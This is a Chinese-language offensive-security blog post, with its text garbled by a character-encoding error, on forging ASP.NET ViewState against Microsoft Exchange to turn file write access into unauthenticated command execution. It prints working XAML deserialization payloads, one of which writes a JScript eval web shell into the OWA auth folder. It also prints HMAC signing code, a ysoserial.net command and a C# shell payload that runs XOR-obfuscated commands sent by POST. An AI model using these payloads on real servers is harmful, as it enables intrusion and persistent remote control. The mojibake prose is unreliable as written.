I"ø><h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¸Šç¯‡æ–‡ç« ã€Šæ¸—é€æŠ€å·§â€”â€”ä»Exchangeæ–‡ä»¶è¯»å†™æƒé™åˆ°å‘½ä»¤æ‰§è¡Œã€‹ä»‹ç»äº†é€šè¿‡.Netååºåˆ—åŒ–ViewStateä»Exchangeæ–‡ä»¶è¯»å†™æƒé™åˆ°å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•ï¼Œåˆ†äº«äº†ä¸‰ç§åˆ©ç”¨è„šæœ¬çš„å¼€å‘ç»†èŠ‚ï¼Œæœ¬æ–‡å°†è¦å…·ä½“åˆ†æç”ŸæˆViewStateçš„ç»†èŠ‚ï¼Œä»‹ç»å¦å¤–ä¸€ç§å®ç°ä»Exchangeæ–‡ä»¶è¯»å†™æƒé™åˆ°å‘½ä»¤æ‰§è¡Œçš„è„šæœ¬å¼€å‘ç»†èŠ‚</p>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>http://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html
https://github.com/pwntester/ysoserial.net</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>ä¸¤ç§ç”ŸæˆViewStateçš„å®ç°æ–¹æ³•</li>
  <li>å¦å¤–ä¸€ç§åˆ©ç”¨è„šæœ¬å¼€å‘çš„ç»†èŠ‚</li>
  <li>å¼€æºä»£ç </li>
</ul>

<h2 id="0x02-èƒŒæ™¯çŸ¥è¯†">0x02 èƒŒæ™¯çŸ¥è¯†</h2>
<hr />

<h3 id="1dotnetååºåˆ—åŒ–viewstateçš„å®ç°åŸç†">1.DotNetååºåˆ—åŒ–ViewStateçš„å®ç°åŸç†</h3>

<p>å¦‚æœèƒ½å¤Ÿè¯»å–web.configçš„æ–‡ä»¶å†…å®¹ï¼Œè·å¾—å…¶ä¸­çš„åŠ å¯†å¯†é’¥å’Œç®—æ³•ï¼Œå°±èƒ½å¤Ÿæ„é€ å‡ºæœ‰æ•ˆçš„åºåˆ—åŒ–æ•°æ®ã€‚å¦‚æœå°†åºåˆ—åŒ–æ•°æ®è®¾ç½®æˆæ¶æ„å§”æ‰˜ï¼Œé‚£ä¹ˆåœ¨ViewStateä½¿ç”¨ObjectStateFormatterè¿›è¡Œååºåˆ—åŒ–è°ƒç”¨å§”æ‰˜æ—¶ï¼Œå°±èƒ½å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>

<h3 id="2viewstateçš„ç”Ÿæˆæµç¨‹">2.ViewStateçš„ç”Ÿæˆæµç¨‹</h3>

<p>ä½¿ç”¨validationkeyå’Œgeneratorä½œä¸ºå‚æ•°ï¼Œå¯¹åºåˆ—åŒ–xamlæ•°æ®è¿›è¡Œç­¾åï¼Œå¹¶æ”¾åœ¨åºåˆ—åŒ–xamlæ•°æ®åï¼Œä½œBase64ç¼–ç åç»„æˆæœ€ç»ˆçš„ViewStatenå†…å®¹</p>

<p>ç›´è§‚ç†è§£ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>data = Serialize(xaml)
ViewState = data + (data+generator).ComputeHash(validationKey)
ViewState = Base64(ViewState)
</code></pre></div></div>

<p>åŠ å¯†ç»†èŠ‚å¯å‚è€ƒï¼š</p>

<p>https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs#L255</p>

<p>https://github.com/0xacb/viewgen/blob/master/viewgen#L156</p>

<p>å…·ä½“ç»†èŠ‚å¯ä½¿ç”¨dnSpyåç¼–è¯‘System.Web.dllï¼Œæ‰¾åˆ°System.Web.Configuration.MachineKeySectionçš„GetEncodedDataå‡½æ•°</p>

<h2 id="0x03-ä¸¤ç§ç”Ÿæˆviewstateçš„å®ç°æ–¹æ³•">0x03 ä¸¤ç§ç”ŸæˆViewStateçš„å®ç°æ–¹æ³•</h2>
<hr />

<p>æµ‹è¯•ç¯å¢ƒï¼š</p>

<p>è·å¾—äº†Exchangeæ–‡ä»¶è¯»å†™æƒé™ï¼Œèƒ½å¤Ÿä¿®æ”¹<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\web.config</code>å’Œ<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\web.config</code>ï¼Œè®¾ç½®machineKeyçš„å†…å®¹å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">&lt;machineKey validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" decryptionKey="E9D2490BD0075B51D1BA5288514514AF" validation="SHA1" decryption="3DES" /&gt;</code></p>

<p>å¯¹äºè¿™ä¸¤ä¸ªä½ç½®çš„.Netååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œï¼Œä¸å†éœ€è¦åˆæ³•ç”¨æˆ·çš„å‡­æ®</p>

<p>ä¸‹é¢ä»‹ç»ä¸¤ç§ç”ŸæˆViewStateçš„ç¨‹åºå®ç°æ–¹æ³•</p>

<h3 id="1ä»xamlæ•°æ®ç”Ÿæˆviewstate">1.ä»xamlæ•°æ®ç”ŸæˆViewState</h3>

<p>æµç¨‹å¦‚ä¸‹ï¼š</p>

<ol>
  <li>æ„é€ xamlæ•°æ®</li>
  <li>ç”Ÿæˆåºåˆ—åŒ–xamlæ•°æ®</li>
  <li>ç”Ÿæˆç­¾åæ•°æ®</li>
  <li>æ‹¼æ¥åºåˆ—åŒ–xamlæ•°æ®å’Œç­¾åæ•°æ®åä½œBase64ç¼–ç </li>
</ol>

<p>(1)æ„é€ xamlæ•°æ®</p>

<p>è¿™é‡Œä»‹ç»4ç§ï¼Œåˆ†åˆ«å¯¹åº”4ä¸ªåŠŸèƒ½</p>

<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
  xmlns:System="clr-namespace:System;assembly=mscorlib" 
    xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;
     &lt;ObjectDataProvider x:Key="" ObjectType="{x:Type Diag:Process}" MethodName="Start" &gt;
     &lt;ObjectDataProvider.MethodParameters&gt;
        &lt;System:String&gt;cmd&lt;/System:String&gt;
        &lt;System:String&gt;"/c notepad"&lt;/System:String&gt;
     &lt;/ObjectDataProvider.MethodParameters&gt;
    &lt;/ObjectDataProvider&gt;
&lt;/ResourceDictionary&gt;
</code></pre></div></div>

<p>å†™æ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib"
    xmlns:w="clr-namespace:System.Web;assembly=System.Web"&gt;
  &lt;s:String x:Key="a" x:FactoryMethod="s:Environment.GetEnvironmentVariable" x:Arguments="ExchangeInstallPath"/&gt;
  &lt;s:String x:Key="b" x:FactoryMethod="Concat"&gt;
    &lt;x:Arguments&gt;
      &lt;StaticResource ResourceKey="a"/&gt;
      &lt;s:String&gt;FrontEnd\\HttpProxy\\owa\\auth\\xaml.aspx&lt;/s:String&gt;
    &lt;/x:Arguments&gt;
  &lt;/s:String&gt;
  &lt;ObjectDataProvider x:Key="x" ObjectType="{x:Type s:IO.File}" MethodName="WriteAllText"&gt;
    &lt;ObjectDataProvider.MethodParameters&gt;
      &lt;StaticResource ResourceKey="b"/&gt;
      &lt;s:String&gt;&amp;lt;%@ Page Language=&amp;quot;Jscript&amp;quot;%&amp;gt;&amp;lt;%eval(Request.Item[&amp;quot;pass&amp;quot;],&amp;quot;unsafe&amp;quot;);%&amp;gt;
      &lt;/s:String&gt;
    &lt;/ObjectDataProvider.MethodParameters&gt;
  &lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="c" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""/&gt;
  &lt;ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="get_Response"/&gt;
  &lt;ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource d}" MethodName="End"/&gt;
&lt;/ResourceDictionary&gt;
</code></pre></div></div>

<p><strong>æ³¨:</strong></p>

<p>éœ€è¦æ³¨æ„xamlçš„è½¬ä¹‰å­—ç¬¦</p>

<p>è®¾ç½®Headerï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib" 
    xmlns:w="clr-namespace:System.Web;assembly=System.Web"&gt;
  &lt;ObjectDataProvider x:Key="a" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""&gt;&lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="b" ObjectInstance="{StaticResource a}" MethodName="get_Response"&gt;&lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="c" ObjectInstance="{StaticResource b}" MethodName="get_Headers"&gt;&lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="d" ObjectInstance="{StaticResource c}" MethodName="Add"&gt;
    &lt;ObjectDataProvider.MethodParameters&gt;
      &lt;s:String&gt;TEST-HEADER&lt;/s:String&gt;
      &lt;s:String&gt;123456&lt;/s:String&gt;
    &lt;/ObjectDataProvider.MethodParameters&gt;
  &lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource b}" MethodName="End"&gt;&lt;/ObjectDataProvider&gt;
&lt;/ResourceDictionary&gt;
</code></pre></div></div>

<p>è®¾ç½®Responseï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
    xmlns:s="clr-namespace:System;assembly=mscorlib" 
    xmlns:w="clr-namespace:System.Web;assembly=System.Web"&gt;
  &lt;ObjectDataProvider x:Key="a" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""&gt;&lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="b" ObjectInstance="{StaticResource a}" MethodName="get_Response"&gt;&lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="c" ObjectInstance="{StaticResource b}" MethodName="Write"&gt;
      &lt;ObjectDataProvider.MethodParameters&gt;
      &lt;s:String&gt;123456&lt;/s:String&gt;
    &lt;/ObjectDataProvider.MethodParameters&gt;
  &lt;/ObjectDataProvider&gt;
  &lt;ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource b}" MethodName="End"&gt;&lt;/ObjectDataProvider&gt;
&lt;/ResourceDictionary&gt;
</code></pre></div></div>

<p>(2)ç”Ÿæˆåºåˆ—åŒ–xamlæ•°æ®</p>

<p>éœ€è¦ç”¨åˆ°Microsoft.PowerShell.Editor.dll</p>

<p>(3)ç”Ÿæˆç­¾åæ•°æ®</p>

<p>å‚è€ƒä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>byte[] validationKey= strToToHexByte(key);
uint _clientstateid = 0;
// Converting "generator" from HEX to INT
if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
		System.Environment.Exit(0);
byte[] _mackey = new byte[4];
_mackey[0] = (byte)_clientstateid;
_mackey[1] = (byte)(_clientstateid &gt;&gt; 8);
_mackey[2] = (byte)(_clientstateid &gt;&gt; 16);
_mackey[3] = (byte)(_clientstateid &gt;&gt; 24);
ms = new MemoryStream();
ms.Write(data,0,data.Length);
ms.Write(_mackey,0,_mackey.Length);
byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»£ç ä¿®æ”¹è‡ªhttps://github.com/zcgonvh/CVE-2020-0688/blob/master/ExchangeCmd.cs#L253</p>

<p>(4)æ‹¼æ¥åºåˆ—åŒ–xamlæ•°æ®å’Œç­¾åæ•°æ®åä½œBase64ç¼–ç </p>

<p>è°ƒç”¨<code class="language-plaintext highlighter-rouge">Convert.ToBase64String()</code>å³å¯</p>

<p>å®Œæ•´çš„å®ç°ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/XamlToViewState.cs</p>

<p>ä»£ç èƒ½å¤Ÿè¯»å–xamlæ–‡ä»¶ï¼Œä½¿ç”¨validationkeyå’Œgeneratorè®¡ç®—ç­¾åï¼Œç”Ÿæˆæœ€ç»ˆçš„ViewState</p>

<p>ä¼˜ç‚¹ï¼š</p>

<p>æµç¨‹æ¸…æ™°ï¼Œä¾¿äºè°ƒè¯•å’Œä¿®æ”¹ç»†èŠ‚</p>

<p>ç¼ºç‚¹ï¼š</p>

<p>éœ€è¦ä¾èµ–ä¸­é—´æ–‡ä»¶Microsoft.PowerShell.Editor.dllï¼Œå ç”¨ç©ºé—´</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>è¯¥æ–¹æ³•çš„å®Œæ•´åˆ©ç”¨æ–‡ä»¶å·²æ‰“åŒ…ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/test/blob/master/XamlToViewState.zip</p>

<h3 id="2ä»åºåˆ—åŒ–xamlæ•°æ®ç”Ÿæˆviewstate">2.ä»åºåˆ—åŒ–xamlæ•°æ®ç”ŸæˆViewState</h3>

<p>å€ŸåŠ©ysoserial.netè·³è¿‡ä»xamlæ•°æ®åˆ°åºåˆ—åŒ–xamlæ•°æ®çš„ç¯èŠ‚ï¼Œæé«˜å¼€å‘æ•ˆç‡</p>

<p>æµç¨‹å¦‚ä¸‹ï¼š</p>

<p>(1)ä¿®æ”¹ysoserial.netæºç ï¼Œç›´æ¥è¯»å–å¯ç”¨çš„åºåˆ—åŒ–xamlæ•°æ®</p>

<p>åœ¨https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs#L209æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Console.WriteLine(payloadString);
Console.WriteLine("The content above is what we need");
Console.WriteLine("-----------");
</code></pre></div></div>

<p>èƒ½å¤Ÿåœ¨æ§åˆ¶å°è¾“å‡ºBase64ç¼–ç çš„åºåˆ—åŒ–xamlæ•°æ®</p>

<p>ç¼–è¯‘ysoserial.netï¼Œç”Ÿæˆysoserial.exeï¼Œåœ¨åŒçº§ç›®å½•æ–°å»ºshellPayload.csï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class E
{
    static string xor(string s) {
        char[] a = s.ToCharArray();
        for(int i = 0; i &lt; a.Length; i++)
        a[i] = (char)(a[i] ^ 'x');
        return new string(a);
}
    public E()
    {
        System.Web.HttpContext context = System.Web.HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            string cmd = context.Request.Form["__Value"];
            cmd = xor(cmd);        
            process.StartInfo.Arguments = "/c " + cmd;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();            
            output = xor(output);
            context.Response.Write(output);

        } catch (System.Exception) { }
        context.Response.Flush();
        context.Response.End();
    }
}
</code></pre></div></div>

<p>ä½¿ç”¨ysoserial.exeç”ŸæˆViewStateï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "shellPayload.cs;System.Web.dll;System.dll;" --validationalg="SHA1" --validationkey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF" --generator="042A94E8"
</code></pre></div></div>

<p>ä»è¾“å‡ºä¸­è·å¾—Base64ç¼–ç çš„åºåˆ—åŒ–xamlæ•°æ®</p>

<p>(2)è®¡ç®—åºåˆ—åŒ–xamlæ•°æ®çš„ç­¾åï¼Œç”Ÿæˆæœ€ç»ˆçš„ViewStateæ•°æ®</p>

<p>ä»£ç å¦‚ä¸‹:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>static string CreateViewState(byte[] dat,string generator,string key)
{
    MemoryStream ms = new MemoryStream();
    byte[] validationKey= strToHexByte(key);

    uint _clientstateid = 0;
    if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
    {
        System.Environment.Exit(0);
    }
 
    byte[] _mackey = new byte[4];
    _mackey[0] = (byte)_clientstateid;
    _mackey[1] = (byte)(_clientstateid &gt;&gt; 8);
    _mackey[2] = (byte)(_clientstateid &gt;&gt; 16);
    _mackey[3] = (byte)(_clientstateid &gt;&gt; 24);

    ms = new MemoryStream();
    ms.Write(dat,0,dat.Length);
    ms.Write(_mackey,0,_mackey.Length);
    byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
    ms=new MemoryStream();
    ms.Write(dat,0,dat.Length);
    ms.Write(hash,0,hash.Length);
    return Convert.ToBase64String(ms.ToArray());
}
</code></pre></div></div>

<p>å®Œæ•´çš„å®ç°ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SerializeXamlToViewState.cs</p>

<p>ä»£ç å®ç°äº†ä»åºåˆ—åŒ–xamlæ•°æ®è®¡ç®—ç­¾åï¼Œç”Ÿæˆæœ€ç»ˆçš„ViewStateæ•°æ®</p>

<p>ä¼˜ç‚¹ï¼š</p>

<p>å ç”¨ç©ºé—´æ›´å°ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ysoserial.netå·²æœ‰çš„Payload</p>

<p>ç¼ºç‚¹ï¼š</p>

<p>è°ƒè¯•å’Œä¿®æ”¹æ¯”è¾ƒéº»çƒ¦</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä»¥ä¸Šä¸¤ç§å®ç°æ–¹æ³•çš„CreateViewState()å‡½æ•°åœ¨ç»†èŠ‚ä¸Šå­˜åœ¨åŒºåˆ«ï¼Œéœ€è¦æ³¨æ„</p>

<h2 id="0x04-å¦å¤–ä¸€ç§åˆ©ç”¨è„šæœ¬å¼€å‘çš„ç»†èŠ‚">0x04 å¦å¤–ä¸€ç§åˆ©ç”¨è„šæœ¬å¼€å‘çš„ç»†èŠ‚</h2>
<hr />

<p>ç”¨æ¥å®ç°ä»Exchangeæ–‡ä»¶è¯»å†™æƒé™åˆ°å‘½ä»¤æ‰§è¡Œ</p>

<p>å‚ç…§ https://github.com/zcgonvh/CVE-2020-0688/blob/master/ExchangeCmd.cs çš„ç»“æ„ï¼Œå°†åºåˆ—åŒ–xamlæ•°æ®å°è£…åœ¨æ•°ç»„ä¸­ï¼Œä½¿ç”¨validationkeyå’Œgeneratorä½œä¸ºå‚æ•°ï¼Œå¯¹åºåˆ—åŒ–xamlæ•°æ®è¿›è¡Œç­¾åï¼Œç»„æˆæœ€ç»ˆçš„ViewStateå†…å®¹</p>

<p>å®Œæ•´çš„å®ç°ä»£ç å·²ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SharpExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.cs</p>

<p>ä»£ç æ”¯æŒä¸¤ä¸ªä½ç½®çš„ååºåˆ—åŒ–æ‰§è¡Œï¼Œåˆ†åˆ«ä¸ºé»˜è®¤å­˜åœ¨çš„æ–‡ä»¶<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\owa\auth\errorFE.aspx</code>å’Œ<code class="language-plaintext highlighter-rouge">%ExchangeInstallPath%\FrontEnd\HttpProxy\ecp\auth\TimeoutLogout.aspx</code></p>

<p>ä»£ç é¦–å…ˆå‘é€<a href="https://github.com/pwntester/ysoserial.net">ysoserial.net</a>å®ç°ActivitySurrogateDisableTypeCheckçš„æ•°æ®ï¼Œæ¥ç€èƒ½å¤Ÿæ‰§è¡Œå‘½ä»¤å¹¶è·å¾—å‘½ä»¤æ‰§è¡Œçš„ç»“æœï¼Œé€šè¿‡POSTæ–¹å¼ä»¥å‚æ•°<code class="language-plaintext highlighter-rouge">__Value</code>å‘é€æ•°æ®ï¼Œé€šä¿¡æ•°æ®é‡‡ç”¨é€å­—ç¬¦å¼‚æˆ–åŠ å¯†</p>

<p>æ”¯æŒçš„åŠŸèƒ½åŒ<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py">ExchangeDeserializeShell-NoAuth-ActivitySurrogateSelectorFromFile.py</a>ä¿æŒä¸€è‡´</p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡åˆ†æäº†ç”ŸæˆViewStateçš„ç»†èŠ‚ï¼Œä»‹ç»äº†ä¸¤ç§ç”ŸæˆViewStateçš„ç¨‹åºå®ç°æ–¹æ³•ï¼Œç¼–å†™ä»£ç å®ç°äº†å¦å¤–ä¸€ç§ä»Exchangeæ–‡ä»¶è¯»å†™æƒé™åˆ°å‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨è„šæœ¬</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET